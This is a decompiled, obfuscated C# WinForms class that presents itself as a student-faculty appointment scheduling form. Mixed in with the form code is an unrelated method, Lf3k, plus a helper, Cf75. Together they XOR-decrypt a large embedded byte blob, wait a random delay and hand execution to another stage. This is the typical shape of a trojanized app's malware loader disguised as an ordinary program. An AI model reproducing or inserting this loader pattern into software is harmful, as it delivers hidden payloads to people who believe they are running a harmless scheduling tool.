using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using c7DN;
using q4F8;
using x5X;

namespace n0AL;

[DesignerGenerated]
public class s9R8 : Form
{
	private Panel _Panel1;

	private Button _Button1;

	private Label _Label4;

	private Label _Label3;

	private Label _Label2;

	private Label _Label1;

	private ComboBox _Appointment;

	private ComboBox _Schedule;

	private ComboBox _FacultyName;

	private TextBox _FacultyEmail;

	private TextBox _StudentEmail;

	private TextBox _TextBox1;

	internal IContainer I;

	internal Label B;

	internal Label p;

	internal NotifyIcon a;

	public s9R8()
	{
		r7L0();
	}

	protected override void Re6m(bool s5NT)
	{
		try
		{
			if (s5NT && I != null)
			{
				I.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(s5NT);
		}
	}

	private void r7L0()
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Expected O, but got Unknown
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Expected O, but got Unknown
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Expected O, but got Unknown
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Expected O, but got Unknown
		//IL_0060: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Expected O, but got Unknown
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Expected O, but got Unknown
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_0080: Expected O, but got Unknown
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		//IL_008b: Expected O, but got Unknown
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0096: Expected O, but got Unknown
		//IL_0097: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a1: Expected O, but got Unknown
		//IL_00a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ac: Expected O, but got Unknown
		//IL_00ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b7: Expected O, but got Unknown
		//IL_00be: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c8: Expected O, but got Unknown
		//IL_0750: Unknown result type (might be due to invalid IL or missing references)
		//IL_075a: Expected O, but got Unknown
		IContainer container = (I = new Container());
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(s9R8));
		e0NB(new Panel());
		Sk92(new Button());
		Cb42(new Label());
		k6X4(new Label());
		c3YG(new Label());
		e1X4(new Label());
		i5Q3(new Label());
		e5NT(new Label());
		y2SD(new ComboBox());
		Wf45(new ComboBox());
		c2R9(new ComboBox());
		Px1k(new TextBox());
		Sa85(new TextBox());
		Dk1b(new TextBox());
		Tz6o(new NotifyIcon(I));
		((Control)f8FP()).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)f8FP()).get_Controls().Add((Control)(object)Cr61());
		((Control)f8FP()).get_Controls().Add((Control)(object)p5S8());
		((Control)f8FP()).get_Controls().Add((Control)(object)Xe47());
		((Control)f8FP()).get_Controls().Add((Control)(object)j5D3());
		((Control)f8FP()).get_Controls().Add((Control)(object)Qi40());
		((Control)f8FP()).get_Controls().Add((Control)(object)Wy9k());
		((Control)f8FP()).get_Controls().Add((Control)(object)d1NX());
		((Control)f8FP()).get_Controls().Add((Control)(object)Nk0m());
		((Control)f8FP()).get_Controls().Add((Control)(object)g2R8());
		((Control)f8FP()).get_Controls().Add((Control)(object)m6WF());
		((Control)f8FP()).get_Controls().Add((Control)(object)k1Q4());
		((Control)f8FP()).get_Controls().Add((Control)(object)Md1t());
		((Control)f8FP()).get_Controls().Add((Control)(object)d2E8());
		((Control)f8FP()).set_Location(new Point(37, 18));
		((Control)f8FP()).set_Name("Panel1");
		((Control)f8FP()).set_Size(new Size(357, 317));
		((Control)f8FP()).set_TabIndex(0);
		((Control)Cr61()).set_Location(new Point(153, 244));
		((Control)Cr61()).set_Name("Button1");
		((Control)Cr61()).set_Size(new Size(166, 25));
		((Control)Cr61()).set_TabIndex(14);
		((ButtonBase)Cr61()).set_Text("Set Appointment");
		((ButtonBase)Cr61()).set_UseVisualStyleBackColor(true);
		p5S8().set_AutoSize(true);
		((Control)p5S8()).set_Location(new Point(47, 215));
		((Control)p5S8()).set_Name("Label5");
		((Control)p5S8()).set_Size(new Size(66, 13));
		((Control)p5S8()).set_TabIndex(9);
		p5S8().set_Text("Appointment");
		Xe47().set_AutoSize(true);
		((Control)Xe47()).set_Location(new Point(47, 174));
		((Control)Xe47()).set_Name("Label4");
		((Control)Xe47()).set_Size(new Size(52, 13));
		((Control)Xe47()).set_TabIndex(10);
		Xe47().set_Text("Schedule");
		j5D3().set_AutoSize(true);
		((Control)j5D3()).set_Location(new Point(47, 100));
		((Control)j5D3()).set_Name("Label6");
		((Control)j5D3()).set_Size(new Size(55, 13));
		((Control)j5D3()).set_TabIndex(11);
		j5D3().set_Text("Faculty ID");
		Qi40().set_AutoSize(true);
		((Control)Qi40()).set_Location(new Point(47, 135));
		((Control)Qi40()).set_Name("Label3");
		((Control)Qi40()).set_Size(new Size(69, 13));
		((Control)Qi40()).set_TabIndex(11);
		Qi40().set_Text("Faculty Email");
		Wy9k().set_AutoSize(true);
		((Control)Wy9k()).set_Location(new Point(47, 64));
		((Control)Wy9k()).set_Name("Label2");
		((Control)Wy9k()).set_Size(new Size(41, 13));
		((Control)Wy9k()).set_TabIndex(12);
		Wy9k().set_Text("Faculty");
		d1NX().set_AutoSize(true);
		((Control)d1NX()).set_Location(new Point(47, 29));
		((Control)d1NX()).set_Name("Label1");
		((Control)d1NX()).set_Size(new Size(32, 13));
		((Control)d1NX()).set_TabIndex(13);
		d1NX().set_Text("Email");
		((ListControl)Nk0m()).set_FormattingEnabled(true);
		Nk0m().get_Items().AddRange(new object[1] { "Grade Consultation" });
		((Control)Nk0m()).set_Location(new Point(153, 207));
		((Control)Nk0m()).set_Name("Appointment");
		((Control)Nk0m()).set_Size(new Size(166, 21));
		((Control)Nk0m()).set_TabIndex(6);
		((ListControl)g2R8()).set_FormattingEnabled(true);
		((Control)g2R8()).set_Location(new Point(153, 166));
		((Control)g2R8()).set_Name("Schedule");
		((Control)g2R8()).set_Size(new Size(166, 21));
		((Control)g2R8()).set_TabIndex(7);
		((ListControl)m6WF()).set_FormattingEnabled(true);
		m6WF().get_Items().AddRange(new object[3] { "Patrick Mack", "Patrick Marlowe", "Maria Ramila Jimenez" });
		((Control)m6WF()).set_Location(new Point(153, 56));
		((Control)m6WF()).set_Name("FacultyName");
		((Control)m6WF()).set_Size(new Size(166, 21));
		((Control)m6WF()).set_TabIndex(8);
		((Control)k1Q4()).set_Location(new Point(153, 93));
		((Control)k1Q4()).set_Name("TextBox1");
		((Control)k1Q4()).set_Size(new Size(164, 20));
		((Control)k1Q4()).set_TabIndex(4);
		((Control)Md1t()).set_Location(new Point(153, 128));
		((Control)Md1t()).set_Name("FacultyEmail");
		((Control)Md1t()).set_Size(new Size(164, 20));
		((Control)Md1t()).set_TabIndex(4);
		((Control)d2E8()).set_Location(new Point(153, 22));
		((Control)d2E8()).set_Name("StudentEmail");
		((Control)d2E8()).set_Size(new Size(164, 20));
		((Control)d2E8()).set_TabIndex(5);
		Zd3e().set_BalloonTipTitle("Click Me!");
		Zd3e().set_Icon((Icon)componentResourceManager.GetObject("NotifyIcon1.Icon"));
		Zd3e().set_Text("NotifyIcon1");
		Zd3e().set_Visible(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(441, 347));
		((Control)this).get_Controls().Add((Control)(object)f8FP());
		((Control)this).set_Name("SetSchedule");
		((Form)this).set_Text("SetSchedule");
		((Control)f8FP()).ResumeLayout(false);
		((Control)f8FP()).PerformLayout();
		((Control)this).ResumeLayout(false);
	}

	[SpecialName]
	internal virtual Panel f8FP()
	{
		return _Panel1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void e0NB(Panel a2H6)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		PaintEventHandler val = new PaintEventHandler(o5PJ);
		Panel panel = _Panel1;
		if (panel != null)
		{
			((Control)panel).remove_Paint(val);
		}
		_Panel1 = a2H6;
		panel = _Panel1;
		if (panel != null)
		{
			((Control)panel).add_Paint(val);
		}
	}

	[SpecialName]
	internal virtual Button Cr61()
	{
		return _Button1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Sk92(Button a8CA)
	{
		EventHandler eventHandler = Ka3g;
		Button button = _Button1;
		if (button != null)
		{
			((Control)button).remove_Click(eventHandler);
		}
		_Button1 = a8CA;
		button = _Button1;
		if (button != null)
		{
			((Control)button).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Label p5S8()
	{
		return B;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Cb42(Label x5GW)
	{
		Label val = (B = x5GW);
	}

	[SpecialName]
	internal virtual Label Xe47()
	{
		return _Label4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void k6X4(Label Qe5a)
	{
		_Label4 = Qe5a;
	}

	[SpecialName]
	internal virtual Label Qi40()
	{
		return _Label3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void e1X4(Label t3BW)
	{
		_Label3 = t3BW;
	}

	[SpecialName]
	internal virtual Label Wy9k()
	{
		return _Label2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void i5Q3(Label e4E6)
	{
		_Label2 = e4E6;
	}

	[SpecialName]
	internal virtual Label d1NX()
	{
		return _Label1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void e5NT(Label Kr9w)
	{
		_Label1 = Kr9w;
	}

	[SpecialName]
	internal virtual ComboBox Nk0m()
	{
		return _Appointment;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void y2SD(ComboBox x5F7)
	{
		_Appointment = x5F7;
	}

	[SpecialName]
	internal virtual ComboBox g2R8()
	{
		return _Schedule;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Wf45(ComboBox Hc6a)
	{
		_Schedule = Hc6a;
	}

	[SpecialName]
	internal virtual ComboBox m6WF()
	{
		return _FacultyName;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void c2R9(ComboBox Yc29)
	{
		EventHandler eventHandler = m9S8;
		ComboBox facultyName = _FacultyName;
		if (facultyName != null)
		{
			facultyName.remove_SelectedIndexChanged(eventHandler);
		}
		_FacultyName = Yc29;
		facultyName = _FacultyName;
		if (facultyName != null)
		{
			facultyName.add_SelectedIndexChanged(eventHandler);
		}
	}

	[SpecialName]
	internal virtual TextBox Md1t()
	{
		return _FacultyEmail;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Sa85(TextBox Dy6d)
	{
		_FacultyEmail = Dy6d;
	}

	[SpecialName]
	internal virtual TextBox d2E8()
	{
		return _StudentEmail;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Dk1b(TextBox r1Q9)
	{
		_StudentEmail = r1Q9;
	}

	[SpecialName]
	internal virtual Label j5D3()
	{
		return p;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void c3YG(Label f1JP)
	{
		Label val = (p = f1JP);
	}

	[SpecialName]
	internal virtual TextBox k1Q4()
	{
		return _TextBox1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Px1k(TextBox g7TD)
	{
		_TextBox1 = g7TD;
	}

	[SpecialName]
	internal virtual NotifyIcon Zd3e()
	{
		return a;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Tz6o(NotifyIcon Pf1q)
	{
		NotifyIcon val = (a = Pf1q);
	}

	private void Ka3g(object sender, EventArgs e)
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0046: Unknown result type (might be due to invalid IL or missing references)
		//IL_006c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0092: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.CompareString(d2E8().get_Text(), "", false) == 0)
		{
			MessageBox.Show("Please enter email address.");
		}
		if (Operators.CompareString(m6WF().get_Text(), "", false) == 0)
		{
			MessageBox.Show("Please choose faculty member.");
		}
		if (Operators.CompareString(g2R8().get_Text(), "", false) == 0)
		{
			MessageBox.Show("Please choose schedule of appointment.");
		}
		if (Operators.CompareString(Nk0m().get_Text(), "", false) == 0)
		{
			MessageBox.Show("Please choose reason of appointment.");
		}
		d7H8.Forms.j8SW().Qa5().Wr1(d2E8().get_Text(), m6WF().get_Text(), g2R8().get_Text(), Nk0m().get_Text(), "PENDING");
		d7H8.Forms.j8SW().Qa5().Ld2(d7H8.Forms.j8SW().Kt0().History);
		d7H8.Forms.Qc8q().Mt89().m9R(d7H8.Forms.Lp3k().t9DB().get_Text(), d7H8.Forms.Lp3k().s9GB().get_Text(), d2E8().get_Text(), g2R8().get_Text(), Nk0m().get_Text(), k1Q4().get_Text());
		d7H8.Forms.Qc8q().Mt89().x2B(d7H8.Forms.Qc8q().r6LE().Pending);
		if (Operators.CompareString(m6WF().get_Text(), "Patrick Mack", false) == 0)
		{
			d7H8.Forms.Gt79().Do4().ShowBalloonTip(500, "Click Me!", "You have an appointment request from" + d7H8.Forms.Lp3k().s9GB().get_Text(), (ToolTipIcon)1);
		}
	}

	internal static void Lf3k()
	{
		byte[] array = t2P.q0B(133632);
		checked
		{
			int g1WK = Conversions.ToInteger(t2P.mDic[t2P.sNum]) * 3;
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				array[i] = Cf75(array[i], (byte[])t2P.mDic[t2P.sArray], g1WK, i);
			}
			t2P.mDic.Add(t2P.mArray, array);
			Task.Delay(new Random().Next(1000, 5000)).Wait();
			Ab7z.c5P9();
		}
	}

	private void m9S8(object sender, EventArgs e)
	{
		//IL_01e5: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.ConditionalCompareObjectEqual(m6WF().get_SelectedItem(), (object)"Patrick Mack", false))
		{
			g2R8().get_Items().Add((object)"Mon 8:30am-12pm");
			g2R8().get_Items().Add((object)"Mon 4:30am-6pm");
			g2R8().get_Items().Add((object)"Tue 1:30pm-3:30pm");
			g2R8().get_Items().Add((object)"Wed 8:30-11:30am");
			g2R8().get_Items().Add((object)"Thu 8:30am-12pm");
			g2R8().set_SelectedIndex(0);
		}
		else if (Operators.ConditionalCompareObjectEqual(m6WF().get_SelectedItem(), (object)"Patrick Oliva", false))
		{
			g2R8().get_Items().Add((object)"Mon 1:30am-3pm");
			g2R8().get_Items().Add((object)"Tue 8:30pm-12pm");
			g2R8().get_Items().Add((object)"Wed 8:30-11:30am");
			g2R8().get_Items().Add((object)"Fri 8:30am-12pm");
			g2R8().set_SelectedIndex(0);
		}
		if (Operators.ConditionalCompareObjectEqual(m6WF().get_SelectedItem(), (object)"Patrick Mack", false))
		{
			Md1t().set_Text("patrickmack@gmail.com");
		}
		else if (Operators.ConditionalCompareObjectEqual(m6WF().get_SelectedItem(), (object)"Patrick Oliva", false))
		{
			Md1t().set_Text("patrickoliva@gmail.com");
		}
		else if (Operators.ConditionalCompareObjectEqual(m6WF().get_SelectedItem(), (object)"Maria Ramila Jimenez", false))
		{
			Md1t().set_Text("mjimenez@gmail.com");
		}
		if (Operators.ConditionalCompareObjectEqual(m6WF().get_SelectedItem(), (object)"Patrick Mack", false))
		{
			k1Q4().set_Text("2020");
		}
		else if (Operators.ConditionalCompareObjectEqual(m6WF().get_SelectedItem(), (object)"Maria Ramila Jimenez", false))
		{
			k1Q4().set_Text("2021");
		}
		else
		{
			MessageBox.Show("GO!");
		}
	}

	internal static byte Cf75(byte Cz3i, byte[] e9L7, int g1WK, int b8M5)
	{
		Cz3i = (byte)(Cz3i ^ checked((byte)(e9L7[unchecked(b8M5 % e9L7.Length)] ^ ((b8M5 + unchecked(g1WK % e9L7.Length)) & g1WK))));
		return Cz3i;
	}

	private void o5PJ(object sender, PaintEventArgs e)
	{
	}
}
